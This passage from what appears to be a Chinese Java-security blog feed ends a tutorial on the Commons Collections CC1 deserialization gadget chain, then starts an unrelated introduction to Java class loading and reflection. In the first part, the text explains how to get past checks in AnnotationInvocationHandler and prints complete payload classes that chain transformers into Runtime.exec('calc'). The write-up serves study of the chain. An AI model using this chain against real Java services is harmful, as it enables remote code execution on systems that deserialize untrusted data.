null)</code>  绕过</h6><p>为了经过第一重判断，我们需要追本溯源，看看 var7 是怎么来的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class var7 = (Class)var3.get(var6);</span><br></pre></td></tr></table></figure><p>var7 是通过 var3 的 get 方法获取到的，看看 var3 是怎么来的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();</span><br></pre></td></tr></table></figure><p>var3 是通过 var2 的 memberTypes 方法获取到的 Map 对象，因此 var3 的 get 方法应当是根据键返回对应的值。</p><p>看看 var2 怎么来的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">    var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">&#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">    throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>var2 是一个 AnnotationType 对象，见名知义，就是注解类型。这里是调用了 AnnotationType.getInstance 方法再将 this.type 作为参数传入。</p><p>而 type 是 AnnotationInvocationHandler 类中定义的一个属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final Class&lt;? extends Annotation&gt; type;</span><br></pre></td></tr></table></figure><p>与 memberValues 一同在构造方法中被赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;</span><br><span class="line">        this.type = var1;</span><br><span class="line">        this.memberValues = var2;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 this.type 其实就是我们传入的注解类 Override.class 。</p><p><strong>梳理一下上面的过程</strong> </p><p>传入的 Override.class 就是 AnnotationInvocationHandler 类的 type 属性值；</p><p>type 属性值被传入 AnnotationType.getInstance 方法作为参数，得到的返回值就是 var2 ，而 AnnotationType 类的 getInstance 方法会返回一个包含指定注解的信息的 AnnotationType 对象；</p><p>接下来调用 var2 的 memberTypes 方法获取 var2 的 memberTypes 属性，并将其赋值给 var3。memberTypes 属性的值是在 AnnotationType.getInstance 方法调用时被赋予的，即传入的指定注解（Override.class）的成员属性的类型。由于 Override 类并没有成员属性，所以 memberTypes 为空，所以 var3 也为空。</p><p>那么接下来通过 var3 的 get 方法获取到的 var7 自然也为空。</p><p><strong>解决方案</strong> </p><p>为了解决这个问题，只需要传入一个有成员属性的注解类即可，这里选择 Target.class（选其他的也可以，比如 Retention.class）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Documented</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(ElementType.ANNOTATION_TYPE)</span><br><span class="line">public @interface Target &#123;</span><br><span class="line">    /**</span><br><span class="line">     * Returns an array of the kinds of elements an annotation type</span><br><span class="line">     * can be applied to.</span><br><span class="line">     * @return an array of the kinds of elements an annotation type</span><br><span class="line">     * can be applied to</span><br><span class="line">     */</span><br><span class="line">    ElementType[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在调用 var3 的 get 方法时需要传入一个参数 var6 ，所以需要修改 var6 为此时 var3 中存在的键名 value（这个键名是通过调试知道的，后面会调试），这样就能顺利地调用 get 方法获取键名中的键值了。</p><p>var6 是这样来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map.Entry var5 = (Map.Entry)var4.next();</span><br><span class="line">String var6 = (String)var5.getKey();</span><br></pre></td></tr></table></figure><p>前面在分析入口类 AnnotationInvocationHandler 的 readObject 方法时，我们讲到 var5 应该是一个 MapEntry 对象，这个对象中存储的键值对其实就是我们给 TransformedMap.decorate 方法传入的 map 参数，那么我们直接修改传入的键为 value 即可。</p><p>于是得到 payload3：</p><h6 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public class payload3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 构造一个 Map 对象，键为 value </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TransformedMap </span><br><span class="line">        Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationConstructor.setAccessible(true);</span><br><span class="line">        // 将有成员属性的 Target.class 传入</span><br><span class="line">        Object o = annotationInvocationConstructor.newInstance(Target.class, transformedmap);</span><br><span class="line"></span><br><span class="line">        // serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="第二重判断-if-var7-isInstance-var8-var8-instanceof-ExceptionProxy-绕过"><a href="#第二重判断-if-var7-isInstance-var8-var8-instanceof-ExceptionProxy-绕过" class="headerlink" title="第二重判断  if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) 绕过"></a>第二重判断  <code>if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy))</code> 绕过</h6><p>我们通过调试 payload3 来查看此时的 var7 ，var8 分别是什么，顺便解答一下前面的疑惑。</p><p><strong>payload3 中在 readObject 处下一个断点：</strong> </p><img src="/images/image-20240508144239204.png"><p><strong>AnnotationInvocationHandler 类的 readObject 方法下四个断点：</strong> </p><img src="/images/image-20240508144351664.png"><p><strong>开始调试，直接跳断点就可以了：</strong> </p><img src="/images/image-20240508144500086.png"><p><strong>接下来我们来看 var2 在初始化之后是什么：</strong> </p><img src="/images/image-20240508144628535.png"><p>可以看到 var2 是一个 AnnotationType 对象，而且其 memberTypes 属性是一个 HashMap 对象，其中的键值对是 “value” -&gt; Target 成员属性的类型 ElementType 。</p><p><strong>看看 var3 被赋值后是什么：</strong> </p><img src="/images/image-20240508145136656.png"><p>var3 获取到的是 var2 的 memberTypes 属性值。</p><p><strong>看看 var7 被赋值后是什么：</strong> </p><img src="/images/image-20240508145350346.png"><p>var7 获取到的就是 var3 键值对中的值。由于 var7 不为空，进入判断。</p><p>**看看 var8 被赋值后是什么，断点不够了再加俩断点： ** </p><img src="/images/image-20240508145858661.png"><p>var8 获取到的是 payload3 中传入的 map 值，这也在预期之中。</p><p><strong>接下来单步进入判断，想不到直接就过去了：</strong> </p><img src="/images/image-20240508150053698.png"><p>点进 var7 的 isInstance 方法去看了一下，在文档中发现这个方法与 instanceof 等效，instanceof 是判断其左边对象是否为其右边类的实例 ，而 isInstance 是 Class 类中的方法，也是用于判断某个实例是否是某个类的实例化对象，但是指向则相反：</p><img src="/images/image-20240508150947421.png"><p>这样就解释得通了，var8 并不是 ElementType 类的对象，var8 也并不是 ExceptionProxy 类的对象，所以这个判断直接过了。</p><p>那么就只剩下最后一个问题了：var5 的 setValue 方法参数不可控。</p><h5 id="var5-的-setValue-方法参数不可控解决办法"><a href="#var5-的-setValue-方法参数不可控解决办法" class="headerlink" title="var5 的 setValue 方法参数不可控解决办法"></a>var5 的 setValue 方法参数不可控解决办法</h5><p>按道理，我们想让 var5 的 setValue 方法参数为 Runtime.class ，但是这里的参数明显不能让我们达成目的。这就要提到 Transformer 接口的一个子类 ConstantTransformer 了。</p><h6 id="ConstantTransformer-类"><a href="#ConstantTransformer-类" class="headerlink" title="ConstantTransformer 类"></a>ConstantTransformer 类</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public class ConstantTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = 6374440726369055124L;</span><br><span class="line">    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);</span><br><span class="line">    private final Object iConstant;</span><br><span class="line"></span><br><span class="line">    public static Transformer getInstance(Object constantToReturn) &#123;</span><br><span class="line">        return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        this.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        return this.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object getConstant() &#123;</span><br><span class="line">        return this.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看 ConstantTransformer 类的 transform 方法会发现：无论传入什么参数，都返回 this.iConstant ，而 iConstant 属性在 ConstantTransformer 的构造方法中被赋值，这个构造方法又被 public 修饰，所以可以直接调用。</p><p>那么我们可以将 ConstantTransformer 的 iConstant 属性赋值成 Runtime.class ，然后将其放在 ChainedTransformer 调用链的最上层，这样无论传入什么，ConstantTransformer 的 transform 方法都会返回 Runtime.class 作为下一个 transform 方法的参数。</p><p>于是我们得到最终 payload ：</p><h6 id="最终-payload"><a href="#最终-payload" class="headerlink" title="最终 payload"></a>最终 payload</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class FinalPayload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                // 将传入参数固定为 Runtime.class</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 构造一个 Map 对象，键为 value</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TransformedMap</span><br><span class="line">        Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationConstructor.setAccessible(true);</span><br><span class="line">        // 将有成员属性的 Target.class 传入（也可以用其他的注解类比如 Retention.class）</span><br><span class="line">        Object o = annotationInvocationConstructor.newInstance(Target.class, transformedmap);</span><br><span class="line"></span><br><span class="line">        // serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>有时候跳源码看会发现源码晦涩难懂，不如直接调试看结果，根据结果修改输入的参数。</p><p>Ref：<a href="https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#IL3zn">https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#IL3zn</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Apache Commons Collections 是对 java.util.Collection 的扩展，对常用的集合操作进行了很好的封装、抽象和补充，在保证性能的同时大大简化代码。CC 链正是在 Commons Collections 包中的反序列化利用链，本次介绍的是 CC1 链。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>基础篇 - Java 的类加载与反射</title>
    <link href="https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Java%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%8F%8D%E5%B0%84/"/>
    <id>https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Java%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%8F%8D%E5%B0%84/</id>
    <published>2024-05-10T11:53:40.078Z</published>
    <updated>2024-06-11T02:17:08.093Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍了 Java 的类加载与反射机制，概括了获得 Class 对象的几种方式，以及总结了反射获取类信息的方法。</p><span id="more"></span><h2 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>class 文件由类装载器装载后，在 JVM 中将形成一份描述 Class 结构的元信息对象，通过该元信息对象可以获知 Class 的结构信息：如构造函数，属性和方法等，Java 允许用户借由这个 Class 相关的元信息对象间接调用 Class 对象的功能。</p><p>虚拟机把描述类的数据从 class 文件加载到内存，并对数据进行校验，转换解析和初始化，最终形成可以被虚拟机直接使用的 Java 类型，这就是虚拟机的类加载机制。</p><h3 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h3><p>ClassLoader ：Java 中的一个抽象类，位于 <code>java.lang</code> 包中，用于实现类的加载机制。</p><p>在 Java 中，有三种主要的类加载器：</p><ol><li><strong>Bootstrap ClassLoader（启动类加载器）：</strong> 这是 Java 虚拟机（JVM）自身的一部分，负责加载 Java 的核心类库，如 <code>java.lang</code> 等。它是用本地代码实现的，无法直接在 Java 代码中访问。</li><li><strong>Extension ClassLoader（扩展类加载器）：</strong> 这个类加载器负责加载 Java 的扩展库，位于 <code>$JAVA_HOME/lib/ext</code> 目录下的 JAR 文件中的类。它是由 <code>sun.misc.Launcher$ExtClassLoader</code> 类实现的。</li><li><strong>System ClassLoader 或 Application ClassLoader（系统类加载器或应用程序类加载器）：</strong> 这个类加载器负责加载应用程序的类路径（Classpath）中指定的类，包括用户自定义的类。它是由 <code>sun.misc.Launcher$AppClassLoader</code> 类实现的。</li></ol><h3 id="类的生命周期"><a href="#类的生命周期" class="headerlink" title="类的生命周期"></a>类的生命周期</h3><p>类从被加载到虚拟机内存中开始到卸载出内存为止，它的整个生命周期可以简单概括为 7 个阶段：：加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）、初始化（Initialization）、使用（Using）和卸载（Unloading）。其中，验证、准备和解析这三个阶段可以统称为连接（Linking）。</p><p>这 7 个阶段的顺序为：</p><p>加载 -&gt; 验证 -&gt; 准备 -&gt; 解析 -&gt; 初始化 -&gt; 使用 -&gt; 卸载</p><p>其中，类加载过程包含上述从加载到初始化的五个阶段，即：</p><p>加载 -&gt; 验证 -&gt; 准备 -&gt; 解析 -&gt; 初始化</p><p>有时候也将验证，准备，解析三个阶段看作一个阶段，叫连接阶段，所以类加载过程又可以描述为：</p><p>加载 -&gt; 连接 -&gt; 初始化</p><h3 id="获得-Class-对象的四种方式"><a href="#获得-Class-对象的四种方式" class="headerlink" title="获得 Class 对象的四种方式"></a>获得 Class 对象的四种方式</h3><p>比如现在有一个类 com.newer.test.Student ，获取该类的 class 对象有以下四种方式：</p><ol><li>通过类名.class</li></ol><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c1 <span class="operator">=</span> Student.class<span class="comment">;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>通过对象的 getClass() 方法，stu 是 Student 类的对象</li></ol><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c2 <span class="operator">=</span> stu.getClass()<span class="comment">;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>通过类加载器获得 class 对象</li></ol><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader classLoader <span class="operator">=</span> ClassLoader.getSystemClassLoader()<span class="comment">;</span></span><br><span class="line">Class c3 <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;com.newer.test.Student&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>值得注意的是，通过类加载器获得 class 对象的这段代码只会经过类加载的五个阶段中的前四个阶段，而不会经过初始化阶段。而类中的静态代码块是在类加载过程中的初始化阶段执行的，所以如果想通过这种方式让类中的静态代码块执行，即触发类的初始化，可以补充以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c3.newInstance();</span><br></pre></td></tr></table></figure><ol start="4"><li>通过 Class.forName() 获得 Class 对象</li></ol><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c4 <span class="operator">=</span>  Class.forName(<span class="string">&quot;com.newer.test.Student&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h2 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>反射（Reflection） 是 Java 程序开发语言的特征之一，它允许运行中的 Java 程序对自身进行检查，或者说“自审”，并能直接操作程序的内部属性和方法。</p><h3 id="通过反射调用方法的流程"><a href="#通过反射调用方法的流程" class="headerlink" title="通过反射调用方法的流程"></a>通过反射调用方法的流程</h3><p>反射调用一般分为 3 个步骤：</p><ul><li>得到要调用类的 Class 对象</li><li>得到要调用的类的方法（Method）</li><li>方法调用（invoke）</li></ul><p>代码示例：</p><ol><li>加载 “com.newer.test.Student” 类，并返回对应的 Class 对象：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(&quot;com.newer.test.Student&quot;);  </span><br></pre></td></tr></table></figure><ol start="2"><li>获取名为 “hi”、参数类型为 int 和 String 的方法，并返回对应的 Method 对象：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method m = cls.getDeclaredMethod(&quot;hi&quot;,new Class[]&#123;int.class,String.class&#125;);  </span><br></pre></td></tr></table></figure><ol start="3"><li>调用之前获取到的方法：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m.invoke(cls.newInstance(),18,&quot;zhangsan&quot;);</span><br></pre></td></tr></table></figure><p>invoke() 方法接收两个参数，第一个参数是要调用方法的对象实例，第二个参数是方法的参数列表。</p><p>cls.newInstance() 创建了一个 com.newer.test.Student 的实例，然后调用该实例的 “hi” 方法，传递了参数 18 和 “zhangsan”。</p><h3 id="反射获取类的信息"><a href="#反射获取类的信息" class="headerlink" title="反射获取类的信息"></a>反射获取类的信息</h3><h6 id="获取类构造器"><a href="#获取类构造器" class="headerlink" title="获取类构造器"></a>获取类构造器</h6><ul><li><code>Connstructor&lt;T&gt; getConstructor(Class&lt;?&gt;...parameterTypes)</code>：返回此 Class 对象对应类的带指定形参的 <strong>public</strong> 构造方法</li><li><code>Constructor&lt;?&gt;[] getConstructors()</code>：返回此 Class 对象对应类的所有 <strong>public</strong> 构造方法</li><li><code>Constructor&lt;T&gt;[] getDeclaredConstructor(Class&lt;?&gt;...parameterTypes)</code>：返回此 Class 对象对应类的带指定参数的构造方法，所有声明的构造方法均可访问。</li><li><code>Constructor&lt;?&gt;[] getDeclaredConstructors()</code>：返回此 Class 对象对应类的所有声明的构造方法</li></ul><h6 id="获取类成员方法"><a href="#获取类成员方法" class="headerlink" title="获取类成员方法"></a>获取类成员方法</h6><ul><li><code>Method getMethod(String name,Class&lt;?&gt;...parameterTypes)</code>：返回此 Class 对象对应类的带指定形参的 public 方法</li><li><code>Method[] getMethods()</code>：返回此 Class 对象对应类的所有 public 方法</li><li><code>Method getDeclaredMethod(string name,Class&lt;?&gt;...parameterTypes)</code>：返回此 Class 对象对应类的带指定形参的方法</li><li><code>Method[] getDeclaredMethods()</code>:返回此 Class 对象对应类的全部方法</li></ul><h6 id="获取类成员变量"><a href="#获取类成员变量" class="headerlink" title="获取类成员变量"></a>获取类成员变量</h6><ul><li><code>Field getField(String name)</code>：返回此 Class 对象对应类的指定名称的 public 成员变量</li><li><code>Field[] getFields()</code>：返回此 Class 对象对应类的所有 public 成员变量</li><li><code>Field getDeclaredField(String name)</code>：返回此 Class 对象对应类的指定名称的成员变量，与成员变量访问权限无关</li><li><code>Field[] getDeclaredFields()</code>：返回此 Class 对象对应类的全部成员变量，与成员变量的访问权限无关</li></ul><h6 id="获取类注解"><a href="#获取类注解" class="headerlink" title="获取类注解"></a>获取类注解</h6><ul><li><code>&lt;A extends Annotation&gt;A getAnnotation(Class&lt;A&gt;annotationClass)</code>：尝试获取该 Class 对象对应类上的指定类型的 Annotation ，如果该类型注解不存在，则返回 null </li><li><code>&lt;A extends Annotation&gt;A getDeclaredAnnotation(Class&lt;A&gt;annotationClass)</code>：这是 Java 8 中新增的，该方法获取直接修饰该 Class 对象对应类的指定类型的 Annotation ，如果不存在，则返回 null </li><li><code>Annotation[] getAnnotations()</code>：返回修饰该 Class 对象对应类上存在的所有 Annotation ，包括从父类继承而来的注解，但是不能获取到私有方法或字段上的注解</li><li><code>Annotation[] getDeclaredAnnotations()</code>：返回修饰该 Class 对象对应类上存在的所有 Annotation ，不包括从父类继承的注解，可以获取到私有方法或字段上的注解</li><li><code>&lt;A extends Annotation&gt;A[] getAnnotationByType(Class&lt;A&gt;annotationClass)</code>：该方法的功能与前面介绍的 getAnnotation() 方法基本相似，但由于 Java8 增加了重复注解功能，因此需要使用该方法获取修饰该类的指定类型的多个 Annotation </li><li><code>&lt;A extends Annotation&gt;A[] getDeclaredAnnotationByType(Class&lt;A&gt;annotationClass)</code>：该方法的功能与前面介绍的 getDeclaredAnnotations() 方法相似，也是因为 Java8 的重复注解的功能，需要使用该方法获取直接修饰该类的指定类型的多个 Annotation</li></ul><h6 id="获取该类内部类"><a href="#获取该类内部类" class="headerlink" title="获取该类内部类"></a>获取该类内部类</h6><ul><li><code>Class&lt;?&gt;[] getDeclaredClasses()</code>：返回该 Class 队形对应类里包含的全部内部类</li></ul><h6 id="获取该类对象所在的外部类"><a href="#获取该类对象所在的外部类" class="headerlink" title="获取该类对象所在的外部类"></a>获取该类对象所在的外部类</h6><ul><li><code>Class&lt;?&gt; getDeclaringClass()</code>：返回该 Class 对象对应类所在的外部类</li></ul><h6 id="获取该类对象对应类所实现的接口"><a href="#获取该类对象对应类所实现的接口" class="headerlink" title="获取该类对象对应类所实现的接口"></a>获取该类对象对应类所实现的接口</h6><ul><li><code>Class&lt;?&gt;[] getInterfaces()</code>：返回该 Class 对象对应类所实现的全部接口</li></ul><h6 id="获取该类对象对应类所继承的父类"><a href="#获取该类对象对应类所继承的父类" class="headerlink" title="获取该类对象对应类所继承的父类"></a>获取该类对象对应类所继承的父类</h6><ul><li><code>Class&lt;? super T&gt; getSuperclass()</code>：返回该 Class 对象对应类的超类的 Class 对象</li></ul><h6 id="获取该类对象对应类的修饰符、所在包、类名等基本信息"><a 